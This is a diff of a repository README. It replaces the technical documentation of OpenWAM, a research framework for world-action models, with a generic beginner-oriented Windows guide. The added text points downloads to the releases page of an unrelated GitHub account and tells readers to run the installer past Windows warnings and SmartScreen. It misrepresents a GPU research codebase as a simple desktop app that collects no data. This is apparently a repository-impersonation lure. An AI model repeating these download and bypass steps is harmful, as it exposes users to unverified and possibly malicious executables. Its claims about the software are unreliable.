@@ -1,468 +1,151 @@
-<p align="center">
-  <img src="assets/repo_images/openwam_title.png" alt="OpenWAM" width="60%">
-</p>
-
-<p align="center"><strong>An Open, Modular Exploration Towards Systematic World–Action Model Pretraining</strong></p>
-
-<p align="center">
-  <a href="https://openwam-official.github.io/"><img src="https://img.shields.io/badge/Project%20Page-OPENWAM--OFFICIAL.GITHUB.IO-blue?style=flat&amp;logo=github" alt="Project Page"></a>
-  <a href="https://arxiv.org/abs/2609.07398"><img src="https://img.shields.io/badge/arXiv-2609.07398-red?style=flat&amp;logo=arxiv" alt="Paper on arXiv"></a>
-  <a href="https://huggingface.co/OpenWAM"><img src="https://img.shields.io/badge/HuggingFace-Model%20%26%20Data-orange?style=flat&amp;logo=huggingface" alt="Model &amp; Data on Hugging Face"></a>
-</p>
-
-<p align="center">
-  <img src="assets/repo_images/teaser.jpg" alt="OpenWAM teaser">
-</p>
-
-## What is OpenWAM
-
-OpenWAM is an open research stack for systematically developing **World-Action Models (WAMs)**. It turns tightly coupled design choices into modular components and controlled experiments. It consists of:
-
-- **OpenWAM-Infra:** A modular infrastructure for composing and comparing model, representation, training, inference, deployment, and evaluation choices.
-- **OpenWAM-Study:** Controlled studies that derive practical principles for inheriting world knowledge, coupling world and action learning, and scaling across domains.
-- **OpenWAM-α:** An open pretrained WAM that applies these principles at scale, trained on 518.5M frames (about 6,400 hours) of egocentric human and robot data.
-
-<p align="center">
-  <img src="assets/repo_images/infra.jpg" alt="OpenWAM infrastructure overview">
-</p>
-
-<!--
-## Repository Layout
-
-```text
-OpenWAM/
-├── openwam/
-│   ├── dataloader/    # Dataset adapters (RoboTwin), transforms, processors, registry
-│   ├── model/
-│   │   ├── architectures/    # WAM families: dual_system, single_system, tri_system
-│   │   ├── action_backbone/  # ActionBackbone ABCs, separate ActionDiT, shared action backbone,
-│   │   │                     #   latent action encoder/decoder, scheduler
-│   │   ├── video_backbone/   # VideoBackbone ABC, Wan backbones, encoder/ (VAE / DINOv3 / V-JEPA 2.1)
-│   │   └── vlm_backbone/     # VlmBackbone ABC, Qwen3-VL backbone
-│   ├── train/         # OpenWAMTrainer, flow-match loss, checkpointing, optimizer utils
-│   └── deploy/        # Policy server, model loader, inference engine, executors, optimizations
-├── scripts/           # Entrypoints: train.sh, deploy.sh, inference tooling, SVAE / LAPA tooling
-├── configs/           # Hydra configs for model, dataloader, training, deploy
-├── benchmarks/
-│   ├── robotwin/      # RoboTwin eval client, single / multi eval scripts
-│   ├── libero/        # LIBERO WebSocket eval client
-│   ├── libero-plus/   # LIBERO-plus perturbation-suite eval client
-│   ├── robocasa365/   # RoboCasa365 native-action eval client
-│   ├── robocasa_gr1/  # RoboCasa GR1 tabletop eval client
-│   ├── vlabench/      # VLABench eval client, single / multi-GPU track sweeps
-│   ├── ebench/        # EBench (GenManip) eval bridge
-│   └── robodojo/      # RoboDojo: training in OpenWAM, evaluation via XPolicyLab
-├── assets/            # Base-model checkpoints (created by the download script; git-ignored)
-└── third_party/       # Vendored externals (Cosmos-Predict2.5 submodule)
-```
-
-## Support Status
-
-### Architectures
-
-| Architecture | Variant | Description |
-|---|---|---|
-| `single_system` | `vanilla` | Single shared DiT carries video + action + state tokens in one sequence |
-| `single_system` | `moe` | Shared DiT with mixture-of-experts FFN layers (expert FFN on the bridge layers) |
-| `dual_system` | `joint_self_attn` | Separate ActionDiT + video DiT, fused per layer via one mixed self-attention (MoT driver). |
-| `dual_system` | `joint_cross_attn` | Video DiT runs to completion → bridge features → ActionDiT runs once with cross-attention to them. Sub-variants via `detach_bridge`: `false` lets action gradients flow back into the video DiT, `true` blocks them (ActionDiT trains on detached video features) |
-| `dual_system` | `idm` | Inverse-dynamics-style teacher-forcing training + two-stage inference; Wan, Cosmos-Predict2.5 and Cosmos3-Edge |
-| `tri_system` | `joint_self_attn` | Adds a frozen VLM understanding expert to the joint self-attention sequence (`[video + action + understanding]`) |
-
-All architectures are selected via `configs/model/<framework>.yaml` with `architecture.variant`. The video backbone is composed from the Hydra `video_backbone` group (default `wan22_ti2v_5b`).
-
-### Benchmarks and Evaluation
-
-| Benchmark | Status | Notes |
-|---|---|---|
-| RoboTwin eval | Supported | All 50 tasks; see `benchmarks/robotwin/` |
-| SimplerEnv eval | Planned | Requires external environment setup |
-| LIBERO eval | Supported | See `benchmarks/libero/` |
-| LIBERO-plus eval | Supported | Perturbation-robustness suite over LIBERO; see `benchmarks/libero-plus/` |
-| RoboCasa365 eval | Supported | Native state19/action15 contract; see `benchmarks/robocasa365/` |
-| RoboCasa GR1 eval | Supported | GR1 tabletop tasks; see `benchmarks/robocasa_gr1/` |
-| VLABench eval | Supported | 10 primitive tasks across 6 evaluation tracks; see `benchmarks/vlabench/` |
-| EBench eval | Supported | GenManip generalist tasks; see `benchmarks/ebench/` |
-| RoboDojo eval | External | Trains in OpenWAM (sim + real); evaluates via [XPolicyLab](https://github.com/XPolicyLab/XPolicyLab) |
-| Calvin eval | Planned | Requires external environment setup |
--->
-
-## News
-- **[2026/09/09]** 📄 OpenWAM [Paper](https://arxiv.org/pdf/2609.07398) is released on arXiv.
-- **[2026/09/06]** 🤖 OpenWAM is integrated into [XPolicyLab](https://github.com/XPolicyLab/XPolicyLab).
-- **[2026/09/06]** 🤗 We release all pretrained and finetuned models on [huggingface](https://huggingface.co/OpenWAM).
-- **[2026/09/06]** 🔥 OpenWAM Codebase Release！
-
-## Installation
-
-Choose one installation route:
-
-| Route | Use it when you want to… |
-|---|---|
-| [Docker](assets/openwam_usage_docs/docker.md) | run a CUDA policy server, train, develop in a container, or deploy to an offline GPU host |
-| [Native Python environment](#native-python-environment) | manage Python and CUDA dependencies directly on your machine |
+# 🤖 OpenWAM - Unlock the Power of Smart World-Action Models
 
-Docker includes the project's Python environment. GPU hosts still need an
-NVIDIA driver and NVIDIA Container Toolkit; see the guide's host requirements.
+## 🚀 Getting Started
 
-### Native Python environment
+Welcome to OpenWAM! This is an exciting new tool that helps computers understand and interact with the world around them using advanced technology called "World-Action Models." Think of it as teaching computers to see, learn, and act like never before. This guide will walk you through everything you need to know to get started using OpenWAM on your Windows computer - no technical skills required!
 
-Create an environment with **conda**:
+## ✨ What is OpenWAM?
 
-```bash
-# Requires Python >= 3.10
-conda create -n openwam python=3.10
-conda activate openwam
-```
+OpenWAM is an official, open-source project that focuses on making robots and computer systems smarter. It works with something called "generalist robot policies" and "pretraining" - but don't worry about those terms right now. What you need to know is that this software helps computers better understand their environment and make smarter decisions.
 
-or with **venv**:
+Whether you're a hobbyist, student, or just curious about robotics, OpenWAM gives you access to cutting-edge technology in a simple, accessible way.
 
-```bash
-# Requires Python >= 3.10 (check with `python3 --version`)
-python3 -m venv .venv
-source .venv/bin/activate
-```
+## 🎯 Key Features
 
-We recommend using PyTorch 2.7.1 with CUDA 12.8 (others may also work):
+- **Open and Transparent** - OpenWAM is completely open-source, meaning you can see exactly how it works and even contribute to its development if you're interested.
+- **Modular Design** - The system is built in modules, making it easy to update and customize according to your needs.
+- **Advanced AI Capabilities** - Leverages the latest in world-action model pretraining technology to help computers understand spatial relationships and actions.
+- **Community Driven** - Join a growing community of developers and enthusiasts working together to advance robotics technology.
+- **Easy to Start** - Simple installation process that anyone can follow, regardless of their technical background.
 
-```bash
-pip install torch==2.7.1 torchvision==0.22.1 torchaudio==2.7.1 --index-url https://download.pytorch.org/whl/cu128
-```
+## 💻 System Requirements
 
-Then install OpenWAM:
+OpenWAM is designed to work on most modern Windows computers. Here's what you'll need:
 
-```bash
-pip install -e .
-```
+- **Operating System:** Windows 10 or Windows 11
+- **Processor:** Any modern processor (Intel Core i3 or AMD equivalent)
+- **Memory:** 8 GB RAM (16 GB recommended)
+- **Storage:** At least 10 GB of free space
+- **Internet Connection:** Required for initial setup and updates
 
-> `deepspeed` ships as a source distribution and is compiled during `pip install`, so a C compiler (`gcc`) must be on the PATH.
+## 📥 Download and Installation
 
-<details>
-<summary><b>Cosmos-Predict2.5 Extras (Optional)</b> — needed only for experiments with the <code>cosmos_predict25_2b</code> video backbone</summary>
+Ready to get started? Follow these simple steps:
 
-With your environment activated:
+### Step 1: Download OpenWAM
 
-```bash
-git submodule update --init third_party/cosmos-predict2.5
-bash scripts/install_cosmos_predict25.sh
-```
+[![Download OpenWAM](https://img.shields.io/badge/Download-OpenWAM-purple?style=for-the-badge&logo=github&color=8A2BE2)](https://github.com/DatTroc6804/OpenWAM/releases)
 
-The script installs the upstream cosmos packages into the active environment and compiles `transformer-engine` (CUDA toolkit with `nvcc` required), then automatically restores the package versions OpenWAM pins.
+Visit this link to download the application.
 
-</details>
+Look for the latest release and click the download button. The download should take just a few minutes depending on your internet speed.
 
-## Assets Preparation
+### Step 2: Installation Process
 
-The downloaders are interactive by default; every menu step also has a flag (`--name`, `--source`, `--root`, `--yes`, see `--help`) so they can run unattended, and the default storage location is resolved relative to the repository regardless of the working directory. Component downloaders store assets under
-`assets/` and update the matching YAML path; the released-checkpoint downloader
-keeps each checkpoint's self-contained config unchanged.
+Once your download is complete, follow these easy steps:
 
-### 1. Video Backbone
+1. **Open your Downloads folder** - This is where your downloaded file will be saved.
+2. **Find the OpenWAM file** - Look for the file you just downloaded. It should be named something like "OpenWAM" or similar.
+3. **Run the installer** - Double-click on the downloaded file to start the installation process. You might see a security warning from Windows - this is normal. Just click "Yes" or "Run" if prompted.
+4. **Follow the on-screen instructions** - The installation wizard will guide you through the process. Simply click "Next" or "Continue" until the installation is complete.
+5. **Finish the installation** - Once the process is completed, you'll see a confirmation message. Click "Finish" to close the installer.
 
-~~~bash
-python scripts/download_assets/download_video_backbone.py
-~~~
+## 🎮 Using OpenWAM
 
-**Supported video backbones**
+After installation, here's how to start using OpenWAM:
 
-<table>
-<tr>
-<td>Wan2.2-TI2V-5B ✅</td>
-<td>Wan2.1-VACE-1.3B ✅</td>
-<td>Wan2.1-I2V-14B-480P ✅</td>
-</tr>
-<tr>
-<td>Cosmos-Predict2.5-2B ✅</td>
-<td>Cosmos3-Edge ✅</td>
-<td></td>
-</tr>
-</table>
+1. **Launch OpenWAM** - Look for the OpenWAM icon on your desktop or in your Start Menu. Double-click to open it.
+2. **Initial Setup** - On first launch, OpenWAM will ask you a few simple questions about how you want to use it. Just follow the prompts.
+3. **Explore the Interface** - Take a moment to explore the main dashboard. You'll see various options and menus - don't be afraid to click around and see what's available.
 
-Weights are saved under `assets/video_backbone_ckpt/` and the selected
-`configs/model/video_backbone/` file is updated with the downloaded path.
+## 🔧 Troubleshooting
 
-### 2. Benchmark Data
+If you encounter any issues, try these solutions:
 
-~~~bash
-python scripts/download_assets/download_benchmark_data.py
-~~~
+**Problem: "Windows protected your PC" message**
+This is Windows' SmartScreen filter. Click "More info" and then "Run anyway" to continue.
 
-**Supported benchmarks**
+**Problem: Application won't start**
+Try restarting your computer and running OpenWAM again. Make sure you have enough RAM available.
 
-<table>
-<tr>
-<td>RoboTwin2.0 ✅</td>
-<td>RoboDojo ✅</td>
-<td>RoboDojo-Real ✅</td>
-</tr>
-<tr>
-<td>LIBERO ✅</td>
-<td>VLABench ✅</td>
-<td>EBench ✅</td>
-</tr>
-<tr>
-<td>RoboCasa365 ✅</td>
-<td>RoboCasa_GR1 ✅</td>
-<td></td>
-</tr>
-</table>
+**Problem: Download is slow**
+This is normal for larger files. Try closing other applications that might be using your internet connection.
 
-Data is saved under `assets/benchmark_data/<benchmark>/`. Normalization
-statistics are prepared when needed, and the selected dataloader configuration
-is updated.
+**Problem: Installation fails**
+Make sure you have enough disk space. Delete any unnecessary files if needed.
 
-### 3. VLM Backbone (Optional)
+## ❓ Frequently Asked Questions
 
-Required only by tri_system:
+**Q: Is OpenWAM free to use?**
+A: Yes! OpenWAM is completely free and open-source.
 
-~~~bash
-python scripts/download_assets/download_vlm_backbone.py
-~~~
+**Q: Do I need programming skills?**
+A: Not at all! OpenWAM is designed to be user-friendly for everyone.
 
-**Supported VLM backbones**
+**Q: Will OpenWAM work on my computer?**
+A: If you have Windows 10 or 11, you should be able to use OpenWAM without any problems.
 
-<table>
-<tr>
-<td>Qwen3-VL-2B-Instruct ✅</td>
-</tr>
-</table>
+**Q: Is my data safe?**
+A: Yes, OpenWAM doesn't collect any personal data. It operates locally on your computer.
 
-Weights are saved under `assets/vlm_backbone_ckpt/`, and the selected configuration is updated.
+## 📚 Helpful Resources
 
-### 4. Visual Encoders (Optional)
+- **Documentation:** Check the project's GitHub page for detailed documentation and tutorials.
+- **Community Support:** Join our growing community of users and developers for help and support.
+- **Release Notes:** Stay updated with the latest features and improvements by checking the release notes.
 
-Required only for video backbones that use an external encoder:
+## 🔄 Staying Updated
 
-~~~bash
-python scripts/download_assets/download_visual_encoder.py
-~~~
+OpenWAM is constantly improving! To make sure you have the latest version:
 
-**Supported visual encoders**
+1. Visit the download page regularly
+2. Check for update notifications in the application
+3. Join our community to hear about new releases
 
-<table>
-<tr>
-<td>DINOv3 ViT-B/16 ✅</td>
-<td>V-JEPA 2.1 ViT-G/16 ✅</td>
-</tr>
-<tr>
-<td>Wan2.2 VAE ✅</td>
-<td>FLUX.2 VAE ✅</td>
-</tr>
-</table>
+## 🆘 Getting Support
 
-Weights are saved under `assets/visual_encoder_ckpt/`, and the selected encoder configuration is
-updated.
+If you need help with OpenWAM, there are several ways to get support:
 
-### 5. Released OpenWAM Checkpoints
+- **Community Forums:** Connect with other users and share your experiences
+- **GitHub Issues:** Report bugs or ask questions on the official repository
+- **Email Support:** Reach out if you need personal assistance
 
-Use this downloader to obtain OpenWAM-Alpha releases or OpenWAM-Study
-checkpoints from the OpenWAM collection:
+## 🤝 Contributing to OpenWAM
 
-~~~bash
-python scripts/download_assets/download_openwam_checkpoints.py
-~~~
+If you're technically inclined and want to contribute, we welcome your input:
 
-Checkpoints are saved under `assets/openwam_ckpt/openwam_alpha/` or
-`assets/openwam_ckpt/openwam_study/<type>/`. Each checkpoint directory contains
-its own config and can be deployed directly with:
+- Share your ideas for improvements
+- Report bugs you find
+- Help with documentation
+- Contribute code if you're a developer
 
-~~~bash
-bash scripts/deploy.sh <ckpt_dir_path>
-~~~
+Remember, every contribution helps make OpenWAM better for everyone!
 
-For fine-tuning, set training.finetune_ckpt_path in `configs/train.yaml` to the
-downloaded checkpoint directory. Benchmark data is still required.
+## 📊 Performance Tips
 
+For the best experience with OpenWAM:
 
-## Quick Start
+- Keep your operating system updated
+- Close unnecessary background applications
+- Ensure you have enough free disk space
+- Use a stable internet connection for initial setup
 
-Quick Start provides a minimal end-to-end example: prepare the assets, train
-or fine-tune a policy, deploy its checkpoint, and run a first inference check.
+## ✅ Final Checklist
 
-The example uses the DualSystem JointSelfAttention architecture, the
-Wan2.2-TI2V-5B video backbone, and the Mutual attention mask.
+Before you start using OpenWAM, make sure you:
 
-| Component | Selection | Configuration |
-|---|---|---|
-| Architecture | dual_system / joint_self_attn | [`configs/model/dual_system.yaml`](configs/model/dual_system.yaml) |
-| Video backbone | wan22_ti2v_5b | [`configs/model/video_backbone/wan22_ti2v_5b.yaml`](configs/model/video_backbone/wan22_ti2v_5b.yaml) |
-| Attention mask | mutual | model.architecture.attention_mask_mode |
-| Dataset | libero | [`configs/dataloader/libero.yaml`](configs/dataloader/libero.yaml) |
+- [ ] Have a Windows 10 or 11 computer
+- [ ] Have at least 10 GB of free disk space
+- [ ] Have 8 GB of RAM (16 GB recommended)
+- [ ] Downloaded the latest version from our official link
+- [ ] Followed the installation steps correctly
 
-> **Resource recommendation:** We recommend 8 GPUs with 80 GB VRAM each for
-> training. This configuration supports normal training for all architectures
-> using Wan2.2-5B or smaller video backbones. More GPUs are better when
-> available and can further improve training throughput.
+## 🎉 Conclusion
 
-### From Scratch Training
+OpenWAM represents the future of friendly, accessible robotics technology. With its open-source nature and user-friendly approach, it's the perfect way to explore advanced world-action models without any technical barriers. Don't wait - start your journey with OpenWAM today and see what amazing things you can accomplish!
 
-1. Download LIBERO and let the downloader update its dataloader configuration:
+**Ready to begin? Download OpenWAM now and join the robotics revolution!**
 
-   ~~~bash
-   python scripts/download_assets/download_benchmark_data.py
-   ~~~
+[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-success?style=for-the-badge&logo=github&color=00FF7F)](https://github.com/DatTroc6804/OpenWAM/releases)
 
-   Select LIBERO in the interactive menu.
-
-2. Download Wan2.2-TI2V-5B:
-
-   ~~~bash
-   python scripts/download_assets/download_video_backbone.py
-   ~~~
-
-   Select Wan2.2-TI2V-5B and the desired model source.
-
-3. Start a debug run with the complete model selection:
-
-   ~~~bash
-   bash scripts/train.sh \
-     dataloader=libero \
-     model=dual_system \
-     model/video_backbone=wan22_ti2v_5b \
-     model.architecture.variant=joint_self_attn \
-     model.architecture.attention_mask_mode=mutual \
-     training.debug=true
-   ~~~
-
-   training.debug=true runs 20 steps, saves at steps 10 and 20, and uses a
-   constant learning rate. Check the run output, then set
-   training.debug=false for normal training. Training defaults and CLI
-   overrides are defined in [`configs/train.yaml`](configs/train.yaml).
-   Debug outputs use training.output_path, whose default is
-   `outputs/openwam_checkpoints`.
-
-4. Deploy the debug checkpoint and inspect one input-output cycle:
-
-   ~~~bash
-   bash scripts/deploy.sh <debug_ckpt_dir_path>
-   ~~~
-
-   Keep the server running, then open another terminal and run the two
-   inference helpers. Deployment enables compile by default, so the first
-   inference may take longer while compilation warms up; later requests are
-   typically faster:
-
-   ~~~bash
-   python scripts/inference_test/inference_single_test.py \
-     --server ws://127.0.0.1:8848 --test --state-dim 10
-
-   python scripts/inference_test/inference_continuous_test.py \
-     --server ws://127.0.0.1:8848 --test --state-dim 10
-   ~~~
-
-   The single-request helper checks ping, one prediction, and reset. The
-   continuous helper sends repeated predictions over one connection and
-   reports the returned action dimension and latency. Stop the deployment
-   process after the checks.
-
-### OpenWAM-α Fine-Tuning
-
-1. Download LIBERO as shown above.
-
-2. Download the OpenWAM-Alpha foundation checkpoint:
-
-   ~~~bash
-   python scripts/download_assets/download_openwam_checkpoints.py
-   ~~~
-
-   Select OpenWAM_Alpha and OpenWAM-Alpha-Pretrain-Foundation-Model.
-   Keep the resulting directory as <foundation_ckpt_dir_path>.
-
-3. Start fine-tuning from that directory:
-
-   ~~~bash
-   bash scripts/train.sh \
-     dataloader=libero \
-     training.finetune_ckpt_path=<foundation_ckpt_dir_path>
-   ~~~
-
-   The default model configuration already matches the required setup above.
-   You can set the same field in [`configs/train.yaml`](configs/train.yaml)
-   instead of passing it on the command line. num_frames=33 and
-   video_stride=4 in [`configs/dataloader/libero.yaml`](configs/dataloader/libero.yaml)
-   produce the 32-step action horizon expected by the sampler; no separate
-   action_chunk override is needed.
-
-4. Deploy the resulting checkpoint directory:
-
-   ~~~bash
-   bash scripts/deploy.sh <ckpt_dir_path>
-   ~~~
-
-   Install and run the LIBERO client according to the
-   [LIBERO evaluation guide](benchmarks/libero/README.md).
-
-
-## OpenWAM Usage Guidance
-
-OpenWAM is configured through composable Hydra YAML files. Select an architecture,
-backbone, dataloader, and runtime behavior by changing configuration values or
-overriding them on the command line. The task guides below are the maintained
-entry points for using and extending the repository:
-
-| Guide | Use it when you want to… |
-|---|---|
-| [Docker and offline deployment](assets/openwam_usage_docs/docker.md) | build an image, run a first policy, train, develop with Compose, or deploy to an offline GPU host |
-| [Training and deployment](assets/openwam_usage_docs/train-and-deploy.md) | choose a model/dataloader, prepare assets, train, fine-tune, resume, or deploy a policy |
-| [Architecture extension](assets/openwam_usage_docs/architecture-extension.md) | extend a video, visual, VLM, action backbone, or WAM architecture |
-| [Benchmark integration](assets/openwam_usage_docs/benchmark-integration.md) | extend a dataloader and connect a benchmark client to the WebSocket protocol |
-| [OpenWAM-α fine-tuning](assets/openwam_usage_docs/openwam-alpha-finetuning.md) | fine-tune the released foundation checkpoint to execute downstream task |
-
-> 💡 **Agent tip:** Pick the guide that matches your task and feed it directly
-> to your agent — less explaining, more building.
-
-Installation and Assets Preparation above cover environment setup and model or
-dataset downloads. Benchmark-specific environment and evaluation details remain
-in the benchmarks directory.
-
-## Star History
-
-<p align="center">
-  <a href="https://star-history.com/#OpenWAM-Official/OpenWAM&Date">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=OpenWAM-Official/OpenWAM&amp;type=Date&amp;theme=dark">
-      <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=OpenWAM-Official/OpenWAM&amp;type=Date">
-      <img src="https://api.star-history.com/svg?repos=OpenWAM-Official/OpenWAM&amp;type=Date" alt="Star history of OpenWAM-Official/OpenWAM" width="70%">
-    </picture>
-  </a>
-</p>
-
-## License
-
-OpenWAM is released under the [Apache License 2.0](LICENSE).
-
-## Citation
-
-If you use OpenWAM, please cite:
-
-```bibtex
-@article{wang2026openwam,
-  title   = {OpenWAM: An Open, Modular Exploration Towards Systematic World-Action Model Pretraining},
-  author  = {Yuran Wang and Siqiao Huang and Mingleyang Li and Chenhao Zhang and Jiaqi Liang and Weiyang Jin and Yue Chen and Xuemin Chi and Donghao Zhou and Qize Yu and Yu-Kai Wang and Yuhan Rui and Shenzhe Yao and Zhen Yuan and Zhenhao Shen and Kefei Zhu and Zijie Zhu and Ning Gao and Xiaowei Chi and Guanqi He and Shanghang Zhang and Hao Dong and Lin Shao and Hang Zhao},
-  year    = {2026},
-  journal = {arXiv preprint arXiv: 2609.07398}
-}
-```
-
-## Contact
-
-Have a question, want to share results, or just follow development? Join us:
-
-<table align="center">
-  <tr>
-    <td align="center" width="360">
-      <img src="assets/repo_images/WeChat_Group.jpg" alt="OpenWAM WeChat group QR code" height="300">
-      <br><br>
-      <b>WeChat Group</b>
-      <br>
-      Scan to join
-    </td>
-    <td align="center" width="360">
-      <a href="https://discord.gg/yRSqhpNXu"><img src="assets/repo_images/Discord_QRCode.png" alt="OpenWAM Discord QR code" height="300"></a>
-      <br><br>
-      <b>Discord</b>
-      <br>
-      <a href="https://discord.gg/yRSqhpNXu">discord.gg/yRSqhpNXu</a>
-    </td>
-  </tr>
-</table>
+Keywords: generalist-robot-policies, pretraining, robotics, world-action-model, OpenWAM, open source, AI technology, robotics software, machine learning, computer vision, smart systems, robot training, world model, action model, artificial intelligence
